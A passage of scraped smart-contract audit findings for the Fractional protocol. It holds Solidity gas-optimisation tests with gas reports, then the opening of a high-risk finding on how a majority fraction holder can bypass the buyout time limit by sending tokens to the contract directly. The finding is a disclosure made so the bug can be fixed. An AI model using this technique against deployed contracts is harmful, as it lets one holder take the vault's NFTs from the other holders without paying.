\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 div2               \u2506 268             \u2506 268 \u2506 268    \u2506 268 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 Contract1 contract \u2506                 \u2506     \u2506        \u2506     \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost    \u2506 Deployment Size \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 32687              \u2506 193             \u2506     \u2506        \u2506     \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name      \u2506 min             \u2506 avg \u2506 median \u2506 max \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 shr2               \u2506 203             \u2506 203 \u2506 203    \u2506 203 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ```  ### Lines - MerkleBase.sol:100  - MerkleBase.sol:136  - MerkleBase.sol:142   ---  ## Cache array length during for loop definition. A typical for loop definition may look like: `for (uint256 i; i < arr.length; i++){}`. Instead of using `array.length`, cache the array length before the loop, and use the cached value to safe gas. This will avoid an `MLOAD` every loop for arrays stored in memory and an `SLOAD` for arrays stored in storage. This can have significant gas savings for arrays with a large length, especially if the array is stored in storage.   ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;     Contract2 c2;     Contract3 c3;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();         c2 = new Contract2();         c3 = new Contract3();     }      function testGas() public view {         uint256[] memory arr = new uint256[](10);         c0.nonCachedMemoryListLength(arr);         c1.cachedMemoryListLength(arr);         c2.nonCachedStorageListLength();         c3.cachedStorageListLength();     } }  contract Contract0 {     function nonCachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract1 {     function cachedMemoryListLength(uint256[] memory arr) public pure {         uint256 j;          uint256 length = arr.length;         for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }  contract Contract2 {     uint256[] arr = new uint256[](10);      function nonCachedStorageListLength() public view {         uint256 j;         for (uint256 i; i < arr.length; i++) {             j = arr[i] + 10;         }     } }  contract Contract3 {     uint256[] arr = new uint256[](10);      function cachedStorageListLength() public view {         uint256 j;         uint256 length = arr.length;          for (uint256 i; i < length; i++) {             j = arr[i] + 10;         }     } }   ```  ### Gas Report ```js \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 src/test/GasTest.t.sol:Contract0 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost                           \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 128171                                    \u2506 672             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name                             \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 nonCachedMemoryListLength                 \u2506 3755            \u2506 3755 \u2506 3755   \u2506 3755 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 src/test/GasTest.t.sol:Contract1 contract \u2506                 \u2506      \u2506        \u2506      \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost                           \u2506 Deployment Size \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 128777                                    \u2506 675             \u2506      \u2506        \u2506      \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name                             \u2506 min             \u2506 avg  \u2506 median \u2506 max  \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 cachedMemoryListLength                    \u2506 3733            \u2506 3733 \u2506 3733   \u2506 3733 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 src/test/GasTest.t.sol:Contract2 contract \u2506                 \u2506       \u2506        \u2506       \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost                           \u2506 Deployment Size \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 118474                                    \u2506 539             \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name                             \u2506 min             \u2506 avg   \u2506 median \u2506 max   \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 nonCachedStorageListLength                \u2506 27979           \u2506 27979 \u2506 27979  \u2506 27979 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e \u2502 src/test/GasTest.t.sol:Contract3 contract \u2506                 \u2506       \u2506        \u2506       \u2506         \u2502 \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561 \u2502 Deployment Cost                           \u2506 Deployment Size \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 118674                                    \u2506 540             \u2506       \u2506        \u2506       \u2506         \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 Function Name                             \u2506 min             \u2506 avg   \u2506 median \u2506 max   \u2506 # calls \u2502 \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 \u2502 cachedStorageListLength                   \u2506 26984           \u2506 26984 \u2506 26984  \u2506 26984 \u2506 1       \u2502 \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  ``` ### Lines - Buyout.sol:454  - MerkleBase.sol:51  - MerkleBase.sol:110  - BaseVault.sol:64  - BaseVault.sol:83  - BaseVault.sol:107  - BaseVault.sol:130   ---  ## Use assembly to write storage values  ```js  contract GasTest is DSTest {     Contract0 c0;     Contract1 c1;      function setUp() public {         c0 = new Contract0();         c1 = new Contract1();     }      function testGas() public {         c0.updateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);         c1.assemblyUpdateOwner(0x158B28A1b1CB1BE12C6bD8f5a646a0e3B2024734);     } }  contract Contract0 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;      function updateOwner(address newOwner) public {         owner = newOwner;     } }  contract Contract1 {     address owner = 0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84;"}, {"title": "[PNM-001] The time constraint of selling fractions can be bypassed by directly transferring fraction tokens to the buyout contract", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/283", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206   # Vulnerability details  ### Description  The `end` function in the `Buyout` contract uses `IERC1155(token).balanceOf(address(this), id)` to determine the amount of deposited fraction tokens without distinguishing whether those fraction tokens are depositied by the `sellFractions` function or by direct transferring. Note that only the `sellFractions` function is constrained by `PROPOSAL_PERIOD`.  This vulnerability lets a 51-holder gain the whole batch of NFTs without paying for the rest 49\\% fractions.  Assume a vault X creates 100 fraction tokens and the market-decided price of a fraction token is 1 ether (i.e., the ideal value of the locked NFTs in vault X is 100 ether). Let's also assume that Alice holds 51 tokens (maybe by paying 51 ether on opensea).  Followings are two scenarios, where the benign one follows the normal workflow and the malicious one exploits the vulnerability.  ### Benign Scenario  + Alice starts a buyout 